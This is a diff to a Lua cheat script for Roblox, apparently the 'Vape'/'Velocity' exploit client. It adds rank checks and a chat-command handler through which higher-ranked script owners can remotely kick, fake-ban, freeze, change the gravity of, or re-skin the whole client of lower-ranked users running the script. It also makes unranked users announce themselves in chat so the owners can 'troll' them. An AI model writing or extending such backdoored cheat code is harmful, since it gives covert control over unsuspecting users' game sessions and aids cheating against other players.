@@ -478,6 +478,16 @@ task.spawn(function()
 		end
 		return false
 	end
+	function WhitelistFunctions:CheckPlayerType(plr)
+                local plrPriority, _, _ = WhitelistFunctions:GetWhitelist(plr)
+                if plrPriority == 0 then
+                        return 'DEFAULT'
+                elseif plrPriority == 1 then
+                        return 'VAPE PRIVATE'
+                elseif plrPriority == 2 then
+                        return 'VAPE OWNER'
+                end
+        end
 end
 shared.vapewhitelist = WhitelistFunctions
 
@@ -506,10 +516,7 @@ local function renderNametag(plr)
         return
     end
     if WhitelistFunctions.LocalPriority >= 1 then
-        local plr = game.Players.LocalPlayer
-        if WhitelistFunctions.playerTags[plr] == nil then 
-	        WhitelistFunctions:CreatePlayerTag(plr, 'VAPE OWNER', '#800080') 
-	end	
+        local plr = game.Players.LocalPlayer	
         local playerlist = game:GetService("CoreGui"):FindFirstChild("PlayerList")
         if playerlist then
             pcall(function()
@@ -5976,21 +5983,182 @@ if replicatedStorageService:FindFirstChild('DefaultChatSystemChatEvents') then
 	end
 end
 
-runFunction(function()
-	local function whitelistFunction(plr)
-		repeat task.wait() until WhitelistFunctions.Loaded
-		if WhitelistFunctions.LocalPriority == 0 then 
-			sendmessage(plr, 'I am using Inhaler Client')
-		end
-	end
-	for i,v in next, playersService:GetPlayers() do 
-		task.spawn(whitelistFunction, v) 
-	end 
-	table.insert(vapeConnections, playersService.PlayerAdded:Connect(whitelistFunction))
-	if WhitelistFunctions.LocalPriority > 0 then 
-		warningNotification('Vape', 'You are now authenticated, Time to troll velocity users!', 4.5)
-	end
+task.spawn(function()
+    local priolist = {
+        DEFAULT = 0,
+        ["VAPE PRIVATE"] = 1,
+        ["VAPE OWNER"] = 2
+    }
+
+    local function findplayers(arg, plr)
+        local temp = {}
+        local continuechecking = true
+        print(arg)
+        if arg == "default" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" then table.insert(temp, lplr) continuechecking = false end
+        if arg == "teamdefault" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" and plr and lplr:GetAttribute("Team") ~= plr:GetAttribute("Team") then table.insert(temp, lplr) continuechecking = false end
+        if arg == "private" and continuechecking and (WhitelistFunctions:CheckPlayerType(lplr) == "VAPE PRIVATE" or WhitelistFunctions:CheckPlayerType(lplr) == "VAPE OWNER") then table.insert(temp, lplr) continuechecking = false end
+        for i,v in pairs(playersService:GetPlayers()) do if continuechecking and v.Name:lower():sub(1, arg:len()) == arg:lower() then table.insert(temp, v) continuechecking = false end end
+        return temp
+    end
+
+    local function transformImage(img, txt)
+        local function funnyfunc(v)
+            if v:GetFullName():find("ExperienceChat") == nil then
+                if v:IsA("ImageLabel") or v:IsA("ImageButton") then
+                    v.Image = img
+                    v:GetPropertyChangedSignal("Image"):Connect(function()
+                        v.Image = img
+                    end)
+                end
+                if v:IsA("TextLabel") or v:IsA("TextButton") then
+                    if v.Text ~= "" then
+                        v.Text = txt
+                    end
+                    v:GetPropertyChangedSignal("Text"):Connect(function()
+                        if v.Text ~= "" then
+                            v.Text = txt
+                        end
+                    end)
+                end
+                if v:IsA("Texture") or v:IsA("Decal") then
+                    v.Texture = img
+                    v:GetPropertyChangedSignal("Texture"):Connect(function()
+                        v.Texture = img
+                    end)
+                end
+                if v:IsA("MeshPart") then
+                    v.TextureID = img
+                    v:GetPropertyChangedSignal("TextureID"):Connect(function()
+                        v.TextureID = img
+                    end)
+                end
+                if v:IsA("SpecialMesh") then
+                    v.TextureId = img
+                    v:GetPropertyChangedSignal("TextureId"):Connect(function()
+                        v.TextureId = img
+                    end)
+                end
+                if v:IsA("Sky") then
+                    v.SkyboxBk = img
+                    v.SkyboxDn = img
+                    v.SkyboxFt = img
+                    v.SkyboxLf = img
+                    v.SkyboxRt = img
+                    v.SkyboxUp = img
+                end
+            end
+        end
+
+        for i, v in pairs(game:GetDescendants()) do
+            funnyfunc(v)
+        end
+        game.DescendantAdded:Connect(funnyfunc)
+    end
+
+    local vapePrivateCommands = {
+        thaw = function(args)
+            if entityLibrary.isAlive then
+                entityLibrary.character.HumanoidRootPart.Anchored = false
+            end
+        end,
+        xylex = function(args)
+            transformImage("http://www.roblox.com/asset/?id=13953598788", "byelex")
+        end,
+        gravity = function(args)
+            workspace.Gravity = tonumber(args[1]) or 192.6
+        end,
+        kick = function(args, plr)
+            local str = ""
+            for i,v in pairs(args) do
+                str = str..v..(i > 1 and " " or "")
+            end
+            task.spawn(function()
+                lplr:Kick(str)
+            end)
+        end,
+        ban = function(args)
+            task.spawn(function()
+                task.wait(3)
+                lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
+            end)
+        end,
+    }
+
+    local ehelpDisplayed = false
+    local commandsDisplayed = {}
+    table.insert(vapeConnections, vapeStore.MessageReceived.Event:Connect(function(plr, message)
+        message = message:gsub('/w ', '')
+        local args = message:split(' ')
+        local first, second = tostring(args[1]), tostring(args[2])
+        if plr.Name == lplr.Name then
+            local client = whitelistStore.whitelist.chatStrings1[#args > 0 and args[#args] or message.Text]
+            local localPriority = priolist[WhitelistFunctions:CheckPlayerType(lplr)] or 0
+            local otherPriority = priolist[WhitelistFunctions:CheckPlayerType(plr)] or 0
+            if localPriority > 0 then
+                if message == "ehelp" or first:sub(1, 6) == ';cmds' then
+                    if not ehelpDisplayed then
+                        local tab = {}
+                        for i,v in pairs(vapePrivateCommands) do
+                            table.insert(tab, i)
+                        end
+                        table.sort(tab)
+                        local str = ""
+                        for i,v in pairs(tab) do
+                            if not commandsDisplayed[v] then
+                                str = str..";"..v.."\n"
+                                commandsDisplayed[v] = true
+                            end
+                        end
+                        if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then 
+                            textChatService.ChatInputBarConfiguration.TargetTextChannel:DisplaySystemMessage(str)
+                        else 
+                            game:GetService('StarterGui'):SetCore('ChatMakeSystemMessage', {Text = str, Color = Color3.fromRGB(255, 255, 255), Font = Enum.Font.SourceSansBold, FontSize = Enum.FontSize.Size24})
+                        end
+                        ehelpDisplayed = true 
+                    else
+                        ehelpDisplayed = false
+                        commandsDisplayed = {}
+                    end
+                end
+            end
+        else
+            if otherPriority > 0 and otherPriority > localPriority and #args > 1 then
+                table.remove(args, 1)
+                local chosenplayers = findplayers(args[1], plr)
+                if table.find(chosenplayers, lplr) then
+                    table.remove(args, 1)
+                    for i,v in pairs(chosenplayers) do
+                        for i,v in pairs(vapePrivateCommands) do
+                            if plr ~= lplr and message:find(';'..i) and (WhitelistFunctions:GetWhitelist(plr) or 0) > (WhitelistFunctions:GetWhitelist(lplr) or 0) then  
+                                v(args, plr)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        if message:find('I am using Inhaler Client.') then
+            if WhitelistFunctions:GetWhitelist(lplr) and WhitelistFunctions:GetWhitelist(lplr) >= 1 then
+                warningNotification('Velocity - Whitelist', 'A player inside your game is using Vape!', 30)
+            end
+        end
+    end))
 end)
+
+local said = false
+local sent = false  
+local function whitelistFunction(plr)
+    repeat task.wait() until WhitelistFunctions.Loaded
+    local plrPriority, _, _ = WhitelistFunctions:GetWhitelist(plr)                                                                                                                                            
+    if WhitelistFunctions.LocalPriority >= 1 and not sent then                                                                                                                                                
+        warningNotification('Vape', 'You are now authenticated, Time to troll velocity users!', 4.5)
+        sent = true
+    elseif WhitelistFunctions.LocalPriority == 0 and WhitelistFunctions:IsSpecialIngame() and not said then
+        sendmessage('helloimusinginhaler')
+        said = true                                                                                                                                                     
+    end
+end
+whitelistFunction(lplr)
 
 runFunction(function()
 	local Disabler = {Enabled = false}
